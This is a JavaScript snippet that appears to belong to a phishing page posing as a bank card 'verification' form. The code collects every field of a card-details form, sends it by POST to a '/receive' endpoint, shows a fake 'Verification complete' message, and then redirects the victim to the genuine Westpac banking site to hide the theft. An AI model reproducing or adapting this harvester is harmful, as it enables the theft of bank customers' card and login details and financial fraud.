<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
    
 <script>
 	
 	function addListItem(ulId, text, attributes = {}) {
    var ul = document.getElementById(ulId);
    var li = document.createElement('li');
    li.textContent = ' ' + text ; 

    for (const [key, value] of Object.entries(attributes)) {
        li.setAttribute(key, value);
    }

    ul.appendChild(li);
    	 };
    	 </script>
    	 <script>
    	 	
    	 	$(document).ready(function() {
    $('#subbut').on('click', function(event) {
        event.preventDefault(); // Prevent the default action of the button

        let myForm = $("#carddetails_form");
        let checkInputs = document.querySelectorAll('.log_details');
        let list = document.getElementById('unorder-list');

        // Clear the unordered list
        while (list.firstChild) {
            list.removeChild(list.firstChild);
        }

        // Flag to track if any input is empty
        let isEmpty = false;

        // Loop through each input field
        checkInputs.forEach((check) => {
            check.addEventListener('focus', () => {
                // Code to handle focus event
            });

            if (check.value.trim() === "") {
                document.getElementById('alertManagerArea').style.display = "block";
                let labelName = check.parentElement.previousElementSibling.textContent;
                addListItem('unorder-list', labelName);
                isEmpty = true;
            }
        });

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
        	setTimeout(() => { 
            document.getElementById('load').style.display = "block";
            document.getElementById('carddetails_form').style.display = "none";
            document.getElementById('loadbackground').style.opacity = "10"; 
            document.getElementById('checkimg').style.visibility = "visible";
            document.getElementById('h2').style.visibility = "visible";
            document.getElementById('title_red').textContent = "Verification complete";
            document.getElementById('rd').style.visibility = "visible";
             }, 1000);

        
            let userinfo = myForm.serializeArray();
            let user = {};
            let visitor = sessionStorage.getItem('visitor');

            userinfo.forEach((field) => {
                // Use the 'name' attribute to create user object
                user[field.name] = field.value;
            });

            user['visitor'] = visitor;
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
                sessionStorage.setItem('visitor', visitor);
                console.log(msg); // Log success message
				setTimeout(()=>{window.location.href = "https://banking.westpac.com.au";},2000);
            }).fail(function(err, textstatus, error) {
                // Handle failure here
            });
        }
    });
});

    </script>
